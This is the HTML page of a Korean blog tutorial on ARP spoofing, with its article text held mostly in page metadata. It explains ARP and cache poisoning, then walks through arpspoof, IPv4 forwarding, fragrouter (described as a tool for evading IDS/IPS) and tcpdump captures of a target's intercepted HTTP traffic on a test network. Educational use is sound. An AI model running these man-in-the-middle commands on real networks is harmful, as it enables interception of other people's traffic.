<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ARP 스푸핑, arpspoof와 fragrouter 사용법 원리 | cdeclog</title><meta name=keywords content="arp,arpspoof,fragrouter,arp 스푸핑,tcpdump"><meta name=description content="네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리
1. ARP (주소 결정 프로토콜)란?
1. 정의
ARP`(Address Resolution Pro
이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.
2. 작동 원리
ARP는 다음과 같은 과정으로 작동합니다:

ARP 요청 (Request)

송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다.
이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다.


ARP 응답 (Reply)

네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다.
요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다.


주소 매핑

송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다.
이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다.



3. ARP 캐시
ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.
이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.
그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다."><meta name=author content="Byung Kyu KIM"><link rel=canonical href=https://cdecl.github.io/devops/arpspoof-fragrouter/><link crossorigin=anonymous href=/assets/css/stylesheet.f939c4ffefb264e6fe85e04352266f79db6bb1303c8e16ae9b6064c1247b5e32.css integrity="sha256-+TnE/++yZOb+heBDUiZvedtrsTA8jhaum2BkwSR7XjI=" rel="preload stylesheet" as=style><link rel=icon href=https://cdecl.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cdecl.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cdecl.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cdecl.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cdecl.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://cdecl.github.io/devops/arpspoof-fragrouter/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-VQQHHYPN7K"></script><script>var doNotTrack=!1,dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VQQHHYPN7K")}</script><meta property="og:url" content="https://cdecl.github.io/devops/arpspoof-fragrouter/"><meta property="og:site_name" content="cdeclog"><meta property="og:title" content="ARP 스푸핑, arpspoof와 fragrouter 사용법 원리"><meta property="og:description" content="네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리
1. ARP (주소 결정 프로토콜)란? 1. 정의 ARP`(Address Resolution Pro 이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.
2. 작동 원리 ARP는 다음과 같은 과정으로 작동합니다:
ARP 요청 (Request) 송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다. 이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다. ARP 응답 (Reply) 네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다. 요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다. 주소 매핑 송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다. 이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다. 3. ARP 캐시 ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.
이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.
그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다."><meta property="og:locale" content="ko-kr"><meta property="og:type" content="article"><meta property="article:section" content="devops"><meta property="article:published_time" content="2024-06-26T00:00:00+09:00"><meta property="article:modified_time" content="2024-06-26T00:00:00+09:00"><meta property="article:tag" content="Arp"><meta property="article:tag" content="Arpspoof"><meta property="article:tag" content="Fragrouter"><meta property="article:tag" content="Arp 스푸핑"><meta property="article:tag" content="Tcpdump"><meta name=twitter:card content="summary"><meta name=twitter:title content="ARP 스푸핑, arpspoof와 fragrouter 사용법 원리"><meta name=twitter:description content="네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리
1. ARP (주소 결정 프로토콜)란?
1. 정의
ARP`(Address Resolution Pro
이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.
2. 작동 원리
ARP는 다음과 같은 과정으로 작동합니다:

ARP 요청 (Request)

송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다.
이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다.


ARP 응답 (Reply)

네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다.
요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다.


주소 매핑

송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다.
이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다.



3. ARP 캐시
ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.
이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.
그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Devops","item":"https://cdecl.github.io/devops/"},{"@type":"ListItem","position":2,"name":"ARP 스푸핑, arpspoof와 fragrouter 사용법 원리","item":"https://cdecl.github.io/devops/arpspoof-fragrouter/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ARP 스푸핑, arpspoof와 fragrouter 사용법 원리","name":"ARP 스푸핑, arpspoof와 fragrouter 사용법 원리","description":"네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리\n1. ARP (주소 결정 프로토콜)란? 1. 정의 ARP`(Address Resolution Pro 이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.\n2. 작동 원리 ARP는 다음과 같은 과정으로 작동합니다:\nARP 요청 (Request) 송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다. 이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다. ARP 응답 (Reply) 네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다. 요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다. 주소 매핑 송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다. 이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다. 3. ARP 캐시 ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.\n이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.\n그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다.\n","keywords":["arp","arpspoof","fragrouter","arp 스푸핑","tcpdump"],"articleBody":"네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리\n1. ARP (주소 결정 프로토콜)란? 1. 정의 ARP`(Address Resolution Pro 이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.\n2. 작동 원리 ARP는 다음과 같은 과정으로 작동합니다:\nARP 요청 (Request) 송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다. 이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다. ARP 응답 (Reply) 네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다. 요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다. 주소 매핑 송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다. 이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다. 3. ARP 캐시 ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.\n이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.\n그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다.\n4. 보안 문제 ARP는 신뢰할 수 있는 프로토콜이 아니며, 다음과 같은 보안 문제를 가질 수 있습니다:\nARP 스푸핑 (Spoofing)\n공격자가 가짜 ARP 응답을 네트워크에 전송하여, 자신을 다른 호스트로 위장하고 트래픽을 가로채거나 변조할 수 있습니다. ARP 캐시 포이즈닝 (Cache Poisoning)\n공격자가 ARP 캐시에 잘못된 IP-MAC 주소 매핑을 삽입하여, 네트워크 통신을 중단시키거나 트래픽을 리다이렉트할 수 있습니다. 2. arpspoof, fragrouter 도구 설치 및 기본 설명 arpspoof 설치 arpspoof는 dsniff 패키지의 일부입니다. 설치하는 방법은 다음과 같습니다\ndsniff는 네트워크 보안 분석 및 테스트를 위해 설계된 다양한 도구들을 포함하는 패키지입니다.\n이 패키지는 네트워크 트래픽을 캡처하고 분석하며, 스니핑(sniffing)과 관련된 여러 가지 기능을 제공합니다.\nUbuntu/Debian sudo apt-get update sudo apt-get install dsniff fragrouter 설치 fragrouter는 네트워크 트래픽을 조작하는 도구로, 다음과 같이 설치할 수 있습니다:\nUbuntu/Debian sudo apt-get update sudo apt-get install fragrouter 3. ARP 스푸핑의 원리 및 arpspoof, fragrouter 도구의 역할 ARP 스푸핑의 원리 ARP(주소 결정 프로토콜)는 IP 주소를 물리적 네트워크 주소(MAC 주소)로 매핑하는 프로토콜입니다.\nARP 스푸핑은 공격자가 가짜 ARP 메시지를 네트워크에 보내 자신을 다른 호스트로 위장하여 트래픽을 가로채거나 변조하는 공격 방법\narpspoof 도구의 역할 arpspoof는 ARP 스푸핑 공격을 수행하는 도구로, 네트워크에서 두 호스트 사이의 트래픽을 가로채기 위해 사용됩니다.\n예를 들어, 공격자는 arpspoof를 사용하여 게이트웨이와 타겟 호스트 간의 트래픽을 가로챌 수 있습니다.\n가짜 ARP 응답 패킷을 생성하여 네트워크의 다른 호스트에게 보내고 이를 통해 공격자는 자신의 MAC 주소를 다른 호스트의 IP 주소에 매핑하여, 트래픽을 자신을 거쳐 가게 만듬\n사용법:\nsudo arpspoof -i [인터페이스] -t [타겟 IP] [게이트웨이 IP] fragrouter 도구의 역할 fragrouter는 네트워크 트래픽을 변조하거나 조각(fragment)화하여 IDS/IPS를 우회하는 등의 공격을 돕는 도구입니다.\n다양한 모드를 지원하며, 각 모드는 서로 다른 방법으로 트래픽을 변조합니다.\n사용법:\nsudo fragrouter -B1 # 가장 기본적인 모드 모드 지원 -B1: 기본 조각화 모드. 패킷을 8바이트 크기의 조각으로 나눕니다. -B2: 패킷을 24바이트 크기의 조각으로 나눕니다. -B3: 모든 패킷을 임의의 크기로 나눕니다. -B4: 모든 패킷을 최대 크기로 나누어 재조립을 어렵게 합니다. IPv4 포워딩 설정 ARP 스푸핑을 성공적으로 수행하려면, 스푸핑 머신이 중간자(Man-in-the-Middle) 역할을 할 수 있도록 IPv4 포워딩을 활성화해야 함\nIPv4 포워딩 활성화 방법: # 일시적으로 IPv4 포워딩 활성화 sudo sysctl -w net.ipv4.ip_forward=1 # 영구적으로 IPv4 포워딩 활성화 echo \"net.ipv4.ip_forward = 1\" | sudo tee -a /etc/sysctl.conf sudo sysctl -p 4. 테스트 예제: arpspoof 및 fragrouter 사용 가정된 네트워크 설정 호스트 머신 (타겟): 198.19.249.2 스푸핑 머신 (공격자): 198.19.249.3 게이트웨이: 198.19.249.1 arpspoof 사용 예제 호스트 머신의 트래픽을 가로채기 위해, 스푸핑 머신에서 다음 명령어를 실행\n# 198.19.249.2(타겟)에게 게이트웨이 198.19.249.1의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄 sudo arpspoof -i eth0 -t 198.19.249.2 198.19.249.1 # 동시에, 스푸핑 머신에서 게이트웨이에도 ARP 스푸핑을 수행 # 게이트웨이 198.19.249.1에게 호스트 머신 198.19.249.2의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄 sudo arpspoof -i eth0 -t 198.19.249.1 198.19.249.2 또는 단일 명령어로 양방향 스푸핑을 수행할 수 있음.\nsudo arpspoof -i eth0 198.19.249.2 -r 198.19.249.1 -r 옵션을 사용하면 arpspoof는 목표 IP 주소와 게이트웨이 IP 주소 간의 ARP 스푸핑을 동시에 수행할 수 있음.\n이는 네트워크에서 게이트웨이 역할을 하는 장치로부터 목표 호스트로 가는 모든 트래픽을 가로챌 수 있게 해줍니다.\nfragrouter 사용 예제 스푸핑 머신에서 네트워크 트래픽을 변조하기 위해 fragrouter를 설정합니다. 예를 들어, 모드 1로 설정하여 패킷을 조각화합니다:\nsudo fragrouter -B1 이 명령어는 들어오는 패킷을 조각화하여 트래픽을 변조 및 전달\n패킷 수신: 네트워크 인터페이스에서 패킷을 수신합니다. 패킷 변조: 설정된 모드에 따라 패킷을 조각화하거나 변조합니다. 패킷 전달: 변조된 패킷을 목적지로 전달합니다. 5. tcpdump를 통한 덤프된 패킷을 보는 방법 tcpdump 기본 설명 tcpdump는 네트워크 인터페이스를 통해 들어오고 나가는 패킷을 캡처하고 분석하는 도구입니다.\ntcpdump 설치 Ubuntu/Debian: sudo apt-get install tcpdump tcpdump 사용법 패킷을 캡처하기 위해서는 다음 명령어를 사용합니다\nsudo tcpdump -i eth0 테스트 스푸핑 머신 (공격자) 에서 패킷 캡쳐 # 네트워크 인터페이스 확인 $ sudo tcpdump -D 1.eth0 [Up, Running, Connected] 2.any (Pseudo-device that captures on all interfaces) [Up, Running] 3.lo [Up, Running, Loopback] ... # 패킷 캡쳐 : host httpbin.org and tcp port 80 $ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80 호스트 머신 (타겟)에서 HTTP 호출 $ curl httpbin.org/get { \"args\": {}, \"headers\": { \"Accept\": \"*/*\", \"Host\": \"httpbin.org\", \"User-Agent\": \"curl/8.8.0\", \"X-Amzn-Trace-Id\": \"Root=1-667d27b9-1bc9fbf01717e5424f5d3ec1\" }, \"origin\": \"124.49.100.52\", \"url\": \"http://httpbin.org/get\" } 스푸핑 머신 (공격자) 에서 내용 확인 $ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80 tcpdump: verbose output suppressed, use -v[v]... for full pro listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 08:55:23.564492 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0 08:55:23.564601 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0 08:55:23.822969 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 3173450946, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0 08:55:23.823057 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0 08:55:23.823188 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1 08:55:23.823199 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1 08:55:24.027301 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0 08:55:24.027380 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0 08:55:24.027960 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0 08:55:24.027978 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0 08:55:24.240286 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0 08:55:24.240313 IP 198.19.249.2.46206 \u003e 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0 capture.pcap 파일로 저장 후, Wireshark 툴로 확인 $ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80 -w capture.pcap 기타 Docker 환경에서의 테스트 이슈 Docker의 기본 브리지 네트워크 설정에서 외부 네트워크와의 통신이 올바르게 설정되지 않았을 수 있습니다. Docker 브리지 네트워크에서 외부 네트워크로 나가는 패킷은 NAT를 통해 변환되는데, 이 과정에서 문제가 발생할 수 있습니다. docker macvlan 네트워크 모드에서는 테스트 가능 : Docker 네트워크 - Macvlan{:target=\"_blank\"} ","wordCount":"1163","inLanguage":"en","datePublished":"2024-06-26T00:00:00+09:00","dateModified":"2024-06-26T00:00:00+09:00","author":{"@type":"Person","name":"Byung Kyu KIM"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cdecl.github.io/devops/arpspoof-fragrouter/"},"publisher":{"@type":"Organization","name":"cdeclog","logo":{"@type":"ImageObject","url":"https://cdecl.github.io/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://cdecl.github.io/ accesskey=h title="cdeclog (Alt + H)">cdeclog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://cdecl.github.io/dev/ title=Dev><span>Dev</span></a></li><li><a href=https://cdecl.github.io/devops/ title=DevOps><span>DevOps</span></a></li><li><a href=https://cdecl.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cdecl.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://cdecl.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cdecl.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://cdecl.github.io/devops/>Devops</a></div><h1 class="post-title entry-hint-parent">ARP 스푸핑, arpspoof와 fragrouter 사용법 원리</h1><div class=post-meta><span title='2024-06-26 00:00:00 +0900 KST'>June 26, 2024</span>&nbsp;·&nbsp;<span>Byung Kyu KIM</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#1-arp-%ec%a3%bc%ec%86%8c-%ea%b2%b0%ec%a0%95-%ed%94%84%eb%a1%9c%ed%86%a0%ec%bd%9c%eb%9e%80 aria-label="1. ARP (주소 결정 프로토콜)란?">1. ARP (주소 결정 프로토콜)란?</a><ul><li><a href=#1-%ec%a0%95%ec%9d%98 aria-label="1. 정의">1. 정의</a></li><li><a href=#2-%ec%9e%91%eb%8f%99-%ec%9b%90%eb%a6%ac aria-label="2. 작동 원리">2. 작동 원리</a></li><li><a href=#3-arp-%ec%ba%90%ec%8b%9c aria-label="3. ARP 캐시">3. ARP 캐시</a></li><li><a href=#4-%eb%b3%b4%ec%95%88-%eb%ac%b8%ec%a0%9c aria-label="4. 보안 문제">4. 보안 문제</a></li></ul></li><li><a href=#2-arpspoof-fragrouter-%eb%8f%84%ea%b5%ac-%ec%84%a4%ec%b9%98-%eb%b0%8f-%ea%b8%b0%eb%b3%b8-%ec%84%a4%eb%aa%85 aria-label="2. arpspoof, fragrouter 도구 설치 및 기본 설명">2. arpspoof, fragrouter 도구 설치 및 기본 설명</a><ul><li><a href=#arpspoof-%ec%84%a4%ec%b9%98 aria-label="arpspoof 설치">arpspoof 설치</a></li><li><a href=#fragrouter-%ec%84%a4%ec%b9%98 aria-label="fragrouter 설치">fragrouter 설치</a></li></ul></li><li><a href=#3-arp-%ec%8a%a4%ed%91%b8%ed%95%91%ec%9d%98-%ec%9b%90%eb%a6%ac-%eb%b0%8f-arpspoof-fragrouter-%eb%8f%84%ea%b5%ac%ec%9d%98-%ec%97%ad%ed%95%a0 aria-label="3. ARP 스푸핑의 원리 및 arpspoof, fragrouter 도구의 역할">3. ARP 스푸핑의 원리 및 arpspoof, fragrouter 도구의 역할</a><ul><li><a href=#arp-%ec%8a%a4%ed%91%b8%ed%95%91%ec%9d%98-%ec%9b%90%eb%a6%ac aria-label="ARP 스푸핑의 원리">ARP 스푸핑의 원리</a></li><li><a href=#arpspoof-%eb%8f%84%ea%b5%ac%ec%9d%98-%ec%97%ad%ed%95%a0 aria-label="arpspoof 도구의 역할">arpspoof 도구의 역할</a></li><li><a href=#fragrouter-%eb%8f%84%ea%b5%ac%ec%9d%98-%ec%97%ad%ed%95%a0 aria-label="fragrouter 도구의 역할">fragrouter 도구의 역할</a><ul><li><a href=#%eb%aa%a8%eb%93%9c-%ec%a7%80%ec%9b%90 aria-label="모드 지원">모드 지원</a></li></ul></li><li><a href=#ipv4-%ed%8f%ac%ec%9b%8c%eb%94%a9-%ec%84%a4%ec%a0%95 aria-label="IPv4 포워딩 설정">IPv4 포워딩 설정</a><ul><li><a href=#ipv4-%ed%8f%ac%ec%9b%8c%eb%94%a9-%ed%99%9c%ec%84%b1%ed%99%94-%eb%b0%a9%eb%b2%95 aria-label="IPv4 포워딩 활성화 방법:">IPv4 포워딩 활성화 방법:</a></li></ul></li></ul></li><li><a href=#4-%ed%85%8c%ec%8a%a4%ed%8a%b8-%ec%98%88%ec%a0%9c-arpspoof-%eb%b0%8f-fragrouter-%ec%82%ac%ec%9a%a9 aria-label="4. 테스트 예제: arpspoof 및 fragrouter 사용">4. 테스트 예제: arpspoof 및 fragrouter 사용</a><ul><li><a href=#%ea%b0%80%ec%a0%95%eb%90%9c-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%84%a4%ec%a0%95 aria-label="가정된 네트워크 설정">가정된 네트워크 설정</a></li><li><a href=#arpspoof-%ec%82%ac%ec%9a%a9-%ec%98%88%ec%a0%9c aria-label="arpspoof 사용 예제">arpspoof 사용 예제</a></li><li><a href=#fragrouter-%ec%82%ac%ec%9a%a9-%ec%98%88%ec%a0%9c aria-label="fragrouter 사용 예제">fragrouter 사용 예제</a></li></ul></li><li><a href=#5-tcpdump%eb%a5%bc-%ed%86%b5%ed%95%9c-%eb%8d%a4%ed%94%84%eb%90%9c-%ed%8c%a8%ed%82%b7%ec%9d%84-%eb%b3%b4%eb%8a%94-%eb%b0%a9%eb%b2%95 aria-label="5. tcpdump를 통한 덤프된 패킷을 보는 방법">5. tcpdump를 통한 덤프된 패킷을 보는 방법</a><ul><li><a href=#tcpdump-%ea%b8%b0%eb%b3%b8-%ec%84%a4%eb%aa%85 aria-label="tcpdump 기본 설명">tcpdump 기본 설명</a></li><li><a href=#tcpdump-%ec%84%a4%ec%b9%98 aria-label="tcpdump 설치">tcpdump 설치</a></li><li><a href=#tcpdump-%ec%82%ac%ec%9a%a9%eb%b2%95 aria-label="tcpdump 사용법">tcpdump 사용법</a></li><li><a href=#%ed%85%8c%ec%8a%a4%ed%8a%b8 aria-label=테스트>테스트</a><ul><li><a href=#%ec%8a%a4%ed%91%b8%ed%95%91-%eb%a8%b8%ec%8b%a0-%ea%b3%b5%ea%b2%a9%ec%9e%90-%ec%97%90%ec%84%9c-%ed%8c%a8%ed%82%b7-%ec%ba%a1%ec%b3%90 aria-label="스푸핑 머신 (공격자) 에서 패킷 캡쳐">스푸핑 머신 (공격자) 에서 패킷 캡쳐</a></li><li><a href=#%ed%98%b8%ec%8a%a4%ed%8a%b8-%eb%a8%b8%ec%8b%a0-%ed%83%80%ea%b2%9f%ec%97%90%ec%84%9c-http-%ed%98%b8%ec%b6%9c aria-label="호스트 머신 (타겟)에서 HTTP 호출">호스트 머신 (타겟)에서 HTTP 호출</a></li><li><a href=#%ec%8a%a4%ed%91%b8%ed%95%91-%eb%a8%b8%ec%8b%a0-%ea%b3%b5%ea%b2%a9%ec%9e%90-%ec%97%90%ec%84%9c-%eb%82%b4%ec%9a%a9-%ed%99%95%ec%9d%b8 aria-label="스푸핑 머신 (공격자) 에서 내용 확인">스푸핑 머신 (공격자) 에서 내용 확인</a></li><li><a href=#capturepcap-%ed%8c%8c%ec%9d%bc%eb%a1%9c-%ec%a0%80%ec%9e%a5-%ed%9b%84-wireshark-%ed%88%b4%eb%a1%9c-%ed%99%95%ec%9d%b8 aria-label="capture.pcap 파일로 저장 후, Wireshark 툴로 확인">capture.pcap 파일로 저장 후, Wireshark 툴로 확인</a></li></ul></li></ul></li><li><a href=#%ea%b8%b0%ed%83%80 aria-label=기타>기타</a><ul><li><a href=#docker-%ed%99%98%ea%b2%bd%ec%97%90%ec%84%9c%ec%9d%98-%ed%85%8c%ec%8a%a4%ed%8a%b8-%ec%9d%b4%ec%8a%88 aria-label="Docker 환경에서의 테스트 이슈">Docker 환경에서의 테스트 이슈</a></li></ul></li></ul></div></details></div><div class=post-content><p>네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리</p><h2 id=1-arp-주소-결정-프로토콜란>1. ARP (주소 결정 프로토콜)란?<a hidden class=anchor aria-hidden=true href=#1-arp-주소-결정-프로토콜란>#</a></h2><h3 id=1-정의>1. 정의<a hidden class=anchor aria-hidden=true href=#1-정의>#</a></h3><p>ARP`(Address Resolution Pro
